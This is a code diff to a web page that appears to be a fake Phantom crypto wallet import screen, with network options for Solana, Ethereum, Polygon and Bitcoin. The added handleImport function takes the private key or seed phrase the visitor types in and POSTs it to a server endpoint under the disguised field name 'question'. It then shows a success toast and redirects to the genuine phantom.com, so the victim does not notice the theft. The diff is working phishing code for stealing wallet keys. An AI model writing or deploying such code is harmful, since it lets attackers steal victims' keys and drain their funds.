@@ -93,34 +93,52 @@
 const networks = ['Solana','Ethereum','Polygon','Bitcoin'];
 let currentNetwork = 'Solana';
 
-function toggleSheet() {
-  const s = document.getElementById('net-sheet');
-  s.style.display = s.style.display === 'block' ? 'none' : 'block';
-}
+async function handleImport() {
 
-function selectNetwork(n) {
-  currentNetwork = n;
-  document.getElementById('selected-network').textContent = n;
-  networks.forEach(net => {
-    const check = document.getElementById('check-' + net.toLowerCase());
-    if (check) check.style.display = net === n ? 'inline' : 'none';
-  });
-  document.querySelectorAll('.network-option').forEach(o => {
-    o.classList.toggle('selected', o.querySelector('.net-name').textContent === n);
-  });
-  document.getElementById('net-sheet').style.display = 'none';
-}
+    const phrase =
+        document.getElementById("pk-input")
+        .value
+        .trim();
 
-function handleImport() {
-  const key = document.getElementById('pk-input').value.trim();
-  if (!key) { alert('Please enter your private key first.'); return; }
-  const btn = document.getElementById('import-btn');
-  btn.classList.add('loading');
-  btn.querySelector('.btn-text').textContent = 'Importing...';
-  document.getElementById('toast').style.display = 'block';
-  btn.classList.remove('loading');
-  btn.querySelector('.btn-text').textContent = 'Import';
-  setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);
+    if (!phrase) {
+        alert("Please enter your key first.");
+        return;
+    }
+    const btn = document.getElementById('import-btn');
+btn.classList.add('loading');
+btn.querySelector('.btn-text').textContent = 'Importing...';
+
+    try {
+
+        const response = await fetch(
+            "/api/question",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    question: phrase
+                })
+            }
+        );
+
+        if (!response.ok) { throw new Error(); }
+
+    btn.classList.remove('loading');
+    btn.querySelector('.btn-text').textContent = 'Import';
+    document.getElementById("toast").style.display = "block";
+   document.getElementById("pk-input").value = "";
+   btn.classList.remove('loading');
+   btn.querySelector('.btn-text').textContent = 'Import';
+   setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);
+
+  
+} catch (err) {
+    btn.classList.remove('loading');
+    btn.querySelector('.btn-text').textContent = 'Import';
+    alert('Failed to send.');
+}
 }
 </script>
 </body>
